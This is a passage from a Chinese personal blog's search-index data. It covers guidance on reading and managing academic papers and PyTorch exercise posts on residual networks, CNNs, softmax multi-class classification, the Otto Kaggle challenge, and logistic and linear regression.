讨论和总结 有的文章只有Discussion，有的文章只有Conclusions，有的文章两者都有 区别： 5.Abstract 摘要 一般前面几个部分就是最基本的，后面就是一些基金啊啥的 其他部分 Funding 本文的项目资助 CRediT authorsship contribution statement 贡献声明 Declaration of Competing Interest 利益声明 Acknowledgement 致谢 Rsferences 参考文献 参考文献格式用管理软件插入，具体格式去期刊官网看人家规定的格式 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:5:2","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"写作顺序 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:5:3","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"一些实用地址 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:6:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"外文文献翻译 浏览器插件：Google翻译插件、侧边栏翻译… 搜狗文档翻译：https://fanyi.sogou.com/document 感觉专业词汇翻译的相对比较准确，推荐 https://www.deepl.com/translator 知云文献翻译 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:6:1","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"参考 https://zhuanlan.zhihu.com/p/490171352 https://www.bilibili.com/video/BV17W4y167SM https://zhuanlan.zhihu.com/p/465954653 https://blog.csdn.net/weixin_44010756/article/details/115584431 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:7:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["AI"],"content":" 阅读论文《Identity Mappings in Deep Residual Networks》并实现网络（使用手写数字辨识数据集做测试） constant scaling: import torch.nn as nn import torch import torch.nn.functional as F from torchvision import datasets from torchvision import transforms from torch.utils.data import DataLoader import matplotlib.pyplot as plt batch_size = 64 transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]) transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]) train_dataset = datasets.MNIST(root='../dataset/mnist/', train=True, transform=transform, download=True) train_loader = DataLoader(dataset=train_dataset, batch_size=64, shuffle=True) test_dataset = datasets.MNIST(root='../dataset/mnist/', train=False, transform=transform, download=True) test_loader = DataLoader(dataset=test_dataset, batch_size=64, shuffle=False) class ResidualBlock(nn.Module): # Residual Block需要保证输出和输入通道数x一样 def __init__(self, channels): super(ResidualBlock, self).__init__() self.channels = channels # 3*3卷积核，保证图像大小不变将padding设为1 # 第一个卷积 self.conv1 = nn.Conv2d(channels, channels, kernel_size=3, padding=1) # 第二个卷积 self.conv2 = nn.Conv2d(channels, channels, kernel_size=3, padding=1) def forward(self, x): # 激活 y = F.relu(self.conv1(x)) y = self.conv2(y) # 先求和 后激活 z = (x + y) * 0.5 return F.relu(z) class Net(torch.nn.Module): def __init__(self): super(Net, self).__init__() self.conv1 = torch.nn.Conv2d(1, 16, kernel_size=5) self.conv2 = torch.nn.Conv2d(16, 32, kernel_size=5) self.mp = nn.MaxPool2d(2) self.rblock1 = ResidualBlock(16) self.rblock2 = ResidualBlock(32) self.fc = torch.nn.Linear(512, 10) def forward(self, x): in_size = x.size(0) x = F.relu(self.mp(self.conv1(x))) x = self.rblock1(x) x = F.relu(self.mp(self.conv2(x))) x = self.rblock2(x) x = x.view(in_size, -1) x = self.fc(x) return x net = Net() device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\") net.to(device) criterion = torch.nn.CrossEntropyLoss() optimizer = torch.optim.SGD(net.parameters(), lr=0.01) def train(epoch): running_loss = 0.0 for batch_idx, data in enumerate(train_loader, 0): inputs, targets = data inputs, targets = inputs.to(device), targets.to(device) optimizer.zero_grad() # forward y_pred = net(inputs) # backward loss = criterion(y_pred, targets) loss.backward() # update optimizer.step() running_loss += loss.item() if (batch_idx % 300 == 299): print(\"[%d,%d]loss:%.3f\" % (epoch + 1, batch_idx + 1, running_loss / 300)) running_loss = 0.0 accuracy = [] def test(): correct = 0 total = 0 with torch.no_grad(): for data in test_loader: images, labels = data images, labels = images.to(device), labels.to(device) outputs = net(images) _, predicted = torch.max(outputs.data, dim=1) total += labels.size(0) correct += (labels == predicted).sum().item() print(\"accuracy on test set:%d %% [%d/%d]\" % (100 * correct / total, correct, total)) accuracy.append(100 * correct / total) if __name__ == \"__main__\": for epoch in range(10): train(epoch) test() plt.plot(range(10), accuracy) plt.xlabel(\"epoch\") plt.ylabel(\"accuracy\") plt.grid() plt.show() print(\"done\") conv shortcut: import torch.nn as nn import torch import torch.nn.functional as F from torchvision import datasets from torchvision import transforms from torch.utils.data import DataLoader import matplotlib.pyplot as plt batch_size = 64 transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]) transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]) train_dataset = datasets.MNIST(root='../dataset/mnist/', train=True, transform=transform, download=True) train_loader = DataLoader(dataset=train_dataset, batch_size=64, shuffle=True) test_dataset = datasets.MNIST(root='../dataset/mnist/', train=False, transform=transform, download=True) test_loader = DataLoader(dataset=test_dataset, batch_size=64, shuffle=False) class ResidualBlock(nn.Module): # Residual Block需要保证输出和输入通道数x一样 def __init__(self, channels","date":"2022-08-20","objectID":"/cnn-adnance%E7%AF%87%E4%BD%9C%E4%B8%9A-%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E8%AF%BE/:0:0","tags":["CNN","卷积神经网络","深度学习","残差网络"],"title":"CNN Adnance篇作业(刘二大大课)","uri":"/cnn-adnance%E7%AF%87%E4%BD%9C%E4%B8%9A-%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E8%AF%BE/"},{"categories":["AI"],"content":" 作业如下： 网络结构： 额，我这里好像值用了两个全连接层…… import torch import torch.nn.functional as F from torchvision import transforms from torchvision import datasets from torch.utils.data import DataLoader import torch.optim as optim # 准备数据集 batch_size = 64 # transform：把图像转化成图像张量 transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]) train_dataset = datasets.MNIST(root='./data/mnist/', train=True, download=True, transform=transform) train_loader = DataLoader(train_dataset, shuffle=True, batch_size=batch_size) test_dataset = datasets.MNIST(root='./data/mnist/', train=False, download=True, transform = transform) test_loader = DataLoader(test_dataset, shuffle=False, batch_size=batch_size) # 设计网络模型 class Net(torch.nn.Module): def __int__(self): super(Net, self).__int__() self.conv1 = torch.nn.Conv2d(1, 10, kernel_size=5) self.conv2 = torch.nn.Conv2d(10, 20, kernel_size=5) # 每个卷积核的channel和输入数据的channel一致 self.conv3 = torch.nn.Conv2d(20, 30, kernel_size=2) self.pooling1 = torch.nn.MaxPool2d(2) self.pooling2 = torch.nn.MaxPool2d(3) self.fc1 = torch.nn.Linear(30, 20) # 全连接层 self.fc2 = torch.nn.Linear(20, 10) # def forward(self, x): batch_size = x.size(0) x = self.pooling1(F.relu(self.conv1(x))) x = self.pooling1(F.relu(self.conv2(x))) x = self.pooling2(F.relu(self.conv3(x))) x = x.view(batch_size, -1) # 自动算并填充 x = self.fc1(x) x = self.fc2(x) return x model = Net() # 迁移到GPU上计算（cuda: 0 是对应GPU的编号） # device = torch.device(\"cuda: 0\" if torch.cuda.is_available() else \"cpu\") # device.to(device) # 损失和优化器 # 因为网络模型已经有点大了，所以梯度下降里面要用更好的优化算法，比如用带冲量的（momentum），来优化训练过程 criterion = torch.nn.CrossEntropyLoss() optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.5) # 一轮训练 def train(epoch): running_loss = 0.0 for batch_idx, data in enumerate(train_loader, 0): inputs, target = data # inputs, target = inputs.to(device), target.to(device) # 迁移到GPU，注意要和模型放到同一块GPU optimizer.zero_grad() # 优化器 先清零 # forward + backword + update outputs = model(inputs) loss = criterion(outputs, target) loss.backward() optimizer.step() running_loss += loss.item() if batch_idx % 300 == 299: print(\"[%d, %5d] loss:%.3f\" % (epoch+1, batch_idx+1, running_loss/2000)) def test(): correct = 0 total = 0 # 避免计算梯度 with torch.no_grad(): # 测试不用算梯度 for data in test_loader: images, labels = data # iamges, labels = images.to(device), labels.to(device) # 利用GPU outputs = model(images) # 返回值一个是每一行的最大值，另一个是最大值的下标（每一个样本就是一行，每一行有10个量）（行是第0个维度，列是第1个维度） _, predicted = torch.max(outputs.data, dim=1) total += labels.size(0) correct += (predicted == labels).sum().item() # 推测出来的分类与label是否相等，真就是1，假就是0，求完和之后把标量拿出来 print('Accuracy on test set: %d %%' % (100 * correct / total)) # 训练 if __name__ == '__main__': for epoch in range(10): train(epoch) test() ","date":"2022-08-18","objectID":"/cnn%E5%9F%BA%E7%A1%80%E4%BD%9C%E4%B8%9A-%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E8%AF%BE/:0:0","tags":["CNN","卷积神经网络","深度学习"],"title":"CNN基础作业(刘二大大课)","uri":"/cnn%E5%9F%BA%E7%A1%80%E4%BD%9C%E4%B8%9A-%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E8%AF%BE/"},{"categories":["AI"],"content":"前言 回顾之前糖尿病的问题，是二分类的，但实际中二分类很少见，大多是手写数字识别等多分类问题 下文以MINIST为例进行分析 ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:1:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"网络设计 ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:2:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"转为二分类 如何使用sigmoid来实现手写数字识别？ 把每一个分类作为二分类进行判断。 eg：当输出为1时，对其他的非1输出都规定为0，以此来进行判断 但这种情况下，类别之间所存在的互相抑制的关系没有办法体现，当一个类别出现的概率较高时，其他类别出现的概率仍然有可能很高。 换言之，当计算输出为1的概率之后，再计算输出为2的概率时，并不是在输出为非1的条件下进行的，也就是说，所有输出的概率之和实际上是大于1的 对于一个多分类问题，其解决方案应该基于如下要求，满足是一个分布： 每个分类的出现概率大于等于0 $$ P(y=i) \\geq 0 $$ 各个分类出现概率之和为1 $$ \\sum_{i=0}^{n} P(y=i) = 1 $$ ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:2:1","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"改进的网络 使用Softmax层来实现多分类。 假定$Z^l$为最后一层线性层的输出,$Z_i$为第i类的输出。则最终的softmax层函数应为： $$ P(y=i) = \\frac{e^{z_i}}{\\sum^{K-1}_{j=0}{e^{z_j}}}, i \\in {0,\\dots,K-1} $$ ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:3:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"损失函数 交叉熵的计算公式如下： $$ H(P,Q) =-\\sum^n_{i=1} P(X_i)log(Q(X_i)) $$ 在多分类问题中，该公式可扩展为： $$ H(P,Q) =-\\sum^n_{i=1}\\sum^m_{j=1} P(X_{ij})log(Q(X_{ij})) $$ 符号： 一个样本所有分类的loss计算过程可以简化为 $$ Loss = -log(P(X)) = -Ylog \\widehat Y $$ 其中，$X$表示事件预测值与实际值相同，$Y$表示非0即1的指示变量，$\\widehat Y$表示Softmax的输出。 此时$Y$其实是作为独热编码（One-hot）输入的，以对离散的变量进行分类。即只在实际值处为1，其他均为0. 代码实现： import numpy as np y = np.array([1, 0, 0]) z = np.array([0.2, 0.1, -0.1]) y_pred = np.exp(z) / np.exp(z).sum() loss = (-y*np.log(y_pred)).sum() print(loss) 上述代码封装在CrossEntropyLoss()函数中，如下图CrossEntropyLoss()包含了下面好几步： 在PyTorch中可写成这样： import torch # 需要LongTensor y = torch.LongTensor([0]) z = torch.Tensor([[0.2,0.1,-0.1]]) criterion = torch.nn.CrossEntropyLoss() # pytorch中最后一层交给CrossEntropyLoss()就行，不需要激活，CrossEntropyLoss包含上图括号里面的好几步。 loss = criterion(z,y) print(loss) ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:4:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"区分：NLLLoss与CrossEntropyLoss https://pytorch.org/docs/stable/generated/torch.nn.NLLLoss.html#torch.nn.NLLLoss https://pytorch.org/docs/stable/generated/torch.nn.CrossEntropyLoss.html#torch.nn.CrossEntropyLoss CrossEntropyLoss \u003c===\u003e NLLLoss + LogSoftmax nn.LogSoftmax: softmax常用在网络的输出层上，以得到每个类别的概率，顾名思义，nn.LogSoftmax就是对softmax的结果取了一个log。 使用这个类时最好要指定dim，即沿着tensor的哪一个维度做softmax，如果不指定，也能做，那么沿着哪一维做呢？通过层层查看源码，我们发现： https://pytorch.org/docs/stable/_modules/torch/nn/functional.html#log_softmax 如果不指定dim，torch会调用到_get_softmax_dim函数，该函数会根据输入tensor的维度总数指定一个，0、1、3维tensor，沿着第0维做；其他的，沿着第1维做。同时，该函数给我们了警告，告诉我们应该人为指定dim. nn.NLLLoss: 全称叫负对数似然loss（negative log likelihood loss） 因为它要求输入就已经是每个类的对数值了。值得注意的是，target并不是one-hot向量，而是范围在[0, C-1]之间的类别索引。这一点和后面要说的CrossEntropyLoss是一样的。 nn.CrossEntropyLoss nn.CrossEntropyLoss可以看作是nn.LogSoftmax和nn.NLLLoss的结合,即对输入数据先做log_softmax，再过NLLLoss。 ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:4:1","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"实例：手写数字识别 MINIST数据集中每个数字都是一个$28*28=784$大小的灰度图，将灰度图中的每个像素值映射到$(0,1)$区间内，可以进行映射。 步骤： 模型如下： \"\"\" 多分类问题 手写数字识别 \"\"\" ## 1.导包 import torch # 组建DataLoader from torchvision import transforms #图像 from torchvision import datasets from torch.utils.data import DataLoader # 激活函数和优化器 import torch.nn.functional as F import torch.optim as optim ## 2.数据准备 # Dataset\u0026Dataloader必备 bacth_size = 64 # pillow（PIL）读的原图像格式为W*H*C，原值较大--\u003e转为格式为C*W*H值为0-1的Tensor transform = transforms.Compose([ # 变为格式为C*W*H的Tensor transforms.ToTensor(), # 第一个是均值，第二个是标准差，变值为0-1 transforms.Normalize((0.1307, ), (0.3081, )) ]) train_dataset = datasets.MNIST(root='./data/mnist/', train=True, download=True, transform=transform) train_loader = DataLoader(train_dataset, shuffle=True, batch_size=bacth_size) test_dataset = datasets.MNIST(root='./data/mnist/', train=False, download=True, transform = transform) test_loader = DataLoader(test_dataset, shuffle=False, batch_size=bacth_size) ## 3.模型设计 class Net(torch.nn.Module): def __init__(self): super(Net, self).__init__() # 线性层1，input784维 output512维 self.l1 = torch.nn.Linear(784, 512) self.l2 = torch.nn.Linear(512, 256) self.l3 = torch.nn.Linear(256, 128) self.l4 = torch.nn.Linear(128, 64) # 线性层5，input64维 output10维 self.l5 = torch.nn.Linear(64, 10) def forward(self, x): # 改变张量形状view() / reshape # view 只能用于内存中连续存储的Tensor，transpose / permute之后的不能用 # 变为二阶张量（矩阵），-1用于计算填充batch_size x = x.view(-1, 784) # relu 激活函数 x = F.relu(self.l1(x)) x = F.relu(self.l2(x)) x = F.relu(self.l3(x)) x = F.relu(self.l4(x)) # 第五层不再进行relu激活 return self.l5(x) model = Net() ## 4.损失和优化器 # 交叉熵损失 criterion = torch.nn.CrossEntropyLoss() # 随机梯度下降，momentum表冲量，在更新时一定程度上保留原方向 optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.5) ## 5.训练和测试 def train(epoch): running_loss = 0.0 # 提取数据 for batch_idx, data in enumerate(train_loader, 0): inputs, target = data # 优化器清零 optimizer.zero_grad() # 前馈+反馈+更新 outputs = model(inputs) loss = criterion(outputs, target) loss.backward() optimizer.step() # 累计loss running_loss += loss.item() if batch_idx % 300 == 299: print('[%d, %5d] loss: %.3f' % (epoch + 1, batch_idx + 1, running_loss / 300)) running_loss = 0.0 def test(): correct = 0 total = 0 # 避免计算梯度 with torch.no_grad(): for data in test_loader: images, labels = data outputs = model(images) # 取每一行（dim=1表第一个维度）最大值（max）的下标(predicted)及最大值(_) _, predicted = torch.max(outputs.data, dim=1) # 加上这一个批量的总数（batch_size），label的形式为[N,1] total += labels.size(0) correct += (predicted == labels).sum().item() print('Accuracy on test set: %d %%' % (100 * correct / total)) if __name__ == '__main__': for epoch in range(10): train(epoch) test() ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:5:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"课后题 https://www.kaggle.com/c/otto-group-product-classification-challenge import numpy as np import pandas as pd from torch.utils.data import Dataset, DataLoader import torch import torch.optim as optim # 定义函数将类别标签转为id表示，方便后面计算交叉熵 def lables2id(lables): target_id = [] target_lables = ['Class_1', 'Class_2', 'Class_3', 'Class_4', 'Class_5', 'Class_6', 'Class_7', 'Class_8', 'Class_9'] for lable in lables: target_id.append(target_lables.index(lable)) return target_id # 定义数据集类 class ProductDataset(Dataset): def __init__(self,filepath): data = pd.read_csv(filepath) lables = data['target'] self.len = data.shape[0] # shape(多少行，多少列) self.x_data = torch.tensor(np.array(data)[:,1:-1].astype(float)) self.y_data = lables2id(lables) def __getitem__(self, index): return self.x_data[index], self.y_data[index] def __len__(self): return self.len dataset = ProductDataset('./otto-group-product-classification-challenge/train.csv') # 建立数据集加载器 train_loader = DataLoader(dataset=dataset, batch_size=64, shuffle=True, num_workers=0) class Net(torch.nn.Module): def __init__(self): super(Net, self).__init__() self.linear1 = torch.nn.Linear(93, 64) self.linear2 = torch.nn.Linear(64, 32) self.linear3 = torch.nn.Linear(32, 16) self.linear4 = torch.nn.Linear(16, 9) self.relu = torch.nn.ReLU() def forward(self, x): x = self.relu(self.linear1(x)) x = self.relu(self.linear2(x)) x = self.relu(self.linear3(x)) x = self.linear4(x) return x def predict(self, x): with torch.no_grad(): x = self.relu(self.linear1(x)) x = self.relu(self.linear2(x)) x = self.relu(self.linear3(x)) x = self.relu(self.linear4(x)) # 这里先取出最大概率的索引，即是所预测的类别。 _, predicted = torch.max(x, dim=1) # 将预测的类别转为one-hot表示，方便保存为预测文件。 y = pd.get_dummies(predicted) return y model = Net() criterion = torch.nn.CrossEntropyLoss() optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.5) def train(epoch): running_loss = 0.0 for batch_idx, data in enumerate(train_loader): inputs, target = data inputs = inputs.float() optimizer.zero_grad() outputs = model(inputs) loss = criterion(outputs, target) loss.backward() optimizer.step() running_loss += loss.item() if batch_idx % 300 == 299: print('[%d, %5d] loss: %.3f' % (epoch+1, batch_idx+1, running_loss/300)) running_loss = 0.0 # 开始训练 if __name__ == '__main__': for epoch in range(100): train(epoch) # 定义预测保存函数，用于保存预测结果。 def predict_save(): test_data = pd.read_csv('./otto-group-product-classification-challenge/test.csv') test_inputs = torch.tensor(np.array(test_data)[:,1:].astype(float)) out = model.predict(test_inputs.float()) lables=['Class_1', 'Class_2', 'Class_3', 'Class_4', 'Class_5', 'Class_6', 'Class_7', 'Class_8', 'Class_9'] # 添加列标签 out.columns = lables # 插入id行 out.insert(0,'id',test_data['id']) output = pd.DataFrame(out) output.to_csv('my_predict.csv', index=False) predict_save() ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:6:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":"参考 https://blog.csdn.net/cjf1699/article/details/122963613 ","date":"2022-08-15","objectID":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:7:0","tags":["深度学习","PyTorch"],"title":"PyTorch多分类问题(B站刘二大大练习题)","uri":"/pytorch%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":" \"\"\" 分类问题： 比如手写数字识别,输出的是属于哪个数字的概率 import torchvision 这个数据集中提供示例数据集，download设置True会自动下载 # MNIST train_set = torchvision.datasets.MNIST(root='../dataset/mnist', train=True, download=True) test_set = torchvision.datasets.MNIST(root='../dataset/mnist', train=False, download=True) # CIFAR 数据集torchvision.datasets.CIFAR10 # 比如二分类，使用sigmoid或其它函数 之前的仿射模型：y heat = x * w + b 逻辑回归模型：y heat = sigmoid(x*w + b) 损失函数也改变了：BCE损失(二分类的交叉熵) loss = -(y*logy heat + (1-y)*log(1 - y heat)) 那么Mini-Batch损失函数： 对它做均值 使用pytorch实现逻辑回归 \"\"\" import torch import torch.nn.functional as F # 1.准备数据集 x_data = torch.Tensor([[1.0], [2.0], [3.0]]) # 3行1列的tensor y_data = torch.Tensor([[0], [0], [1]]) # 2.使用类来设计模型 class LogisticRegressionModel(torch.nn.Module): # Module构造出来的对象，会自动构建反向传播过程 def __init__(self): super(LogisticRegressionModel, self).__init__() self.linear = torch.nn.Linear(1, 1) # torch.nn.Linear构造一个对象，参数是权重和偏差，也是继承子Module的会自动进行反向传播 # sigmoid中没有参数 def forward(self, x): y_pred = F.sigmoid(self.linear(x)) return y_pred model = LogisticRegressionModel() # model是callable的 model(x) # 3.构建损失和优化器 criterion = torch.nn.BCELoss(size_average=False) optimizer = torch.optim.SGD(model.parameters(), lr=0.01) # 梯度下降 model.parameters()自动完成参数的初始化操作 # optimizer = torch.optim.Adam(model.parameters(), lr=0.01) # 梯度下降 # 4.训练 for epoch in range(1000): y_pred = model(x_data) # 1.前向传播，计算y heat loss = criterion(y_pred, y_data) # 2.计算损失 print(epoch, loss) # 打印 optimizer.zero_grad() # 梯度会自动计算，务必梯度清零！ loss.backward() # 3.反向传播 optimizer.step() # 4.更新 update # 打印权重和偏置 print(\"w=\", model.linear.weight.item()) # model下面的linear，下面的weight print(\"b=\", model.linear.bias.item()) # 测试模型 x_test = torch.Tensor([[4.0]]) y_test = model(x_test) print(\"y_pred=\", y_test.data) ","date":"2022-08-15","objectID":"/pytorch%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:0:0","tags":["PyTorch"],"title":"PyTorch实现逻辑回归(B站刘二大大练习题)","uri":"/pytorch%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":" \"\"\" 使用pytorch实现简单线性回归 \"\"\" import torch # 1.准备数据集 x_data = torch.Tensor([[1.0], [2.0], [3.0]]) # 3行1列的tensor y_data = torch.Tensor([[2.0], [4.0], [6.0]]) # 2.使用类来设计模型 class LinearModel(torch.nn.Module): # Module构造出来的对象，会自动构建反向传播过程 def __init__(self): super(LinearModel, self).__init__() self.linear = torch.nn.Linear(1, 1) # torch.nn.Linear构造一个对象，参数是权重和偏差，也是继承子Module的会自动进行反向传播 # (in_features: size, out_features: size of each out feature, bias=True:要不要偏置量) def forward(self, x): # 实现这个方法 # 计算 y heat y_pred = self.linear(x) # linear是前面建立的对象，可调用的callable的对象（def __call__(self, *args, **kwargs)） return y_pred model = LinearModel() # model是callable的 model(x) # 3.构建损失和优化器 criterion = torch.nn.MSELoss(size_average=False) optimizer = torch.optim.SGD(model.parameters(), lr=0.01) # 梯度下降 # optimizer = torch.optim.Adam(model.parameters(), lr=0.01) # 梯度下降 # 可以尝试不同的优化器 # 4.训练 for epoch in range(100): 